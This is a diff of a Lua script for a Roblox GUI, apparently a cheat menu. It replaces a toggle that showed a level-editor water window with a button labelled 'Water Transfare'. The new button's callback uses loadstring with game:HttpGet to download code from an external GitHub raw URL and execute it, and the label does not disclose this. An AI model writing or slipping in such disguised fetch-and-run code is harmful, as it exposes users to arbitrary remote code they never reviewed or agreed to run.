@@ -520,18 +520,12 @@ local Tab = Window:MakeTab({
  PremiumOnly = false
 })
 Tab:AddLabel("Secret Functions")
-Tab:AddToggle({
- Name = "Water Transe!",
- Default = false,
- Callback = function(ToggleGui2)
- if ToggleGui2 == true then
- antiError = 0
- game:GetService("Players").LocalPlayer.PlayerGui.LevelCreator.BackDrop.Windows.Water.WaterTrans.Visible = true
- elseif antiError == 0 then
- antiError = 1
- game:GetService("Players").LocalPlayer.PlayerGui.LevelCreator.BackDrop.Windows.Water.WaterTrans.Visible = false
+Tab:AddButton({
+ Name = "Water Transfare",
+ Callback = function()
+
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/Kirill31312/HBSNX/main/Xjwxn"))()
  end
- end 
 })
 Tab:AddLabel("Unused objects")
 Tab:AddParagraph("How to use objects","First, click on the button on which you want to insert the object, then, pull the ring out of the object list, put it on, then click on the button in the game (Save & Exit) then select the level at which you put the ring, and it will become the object you clicked on")
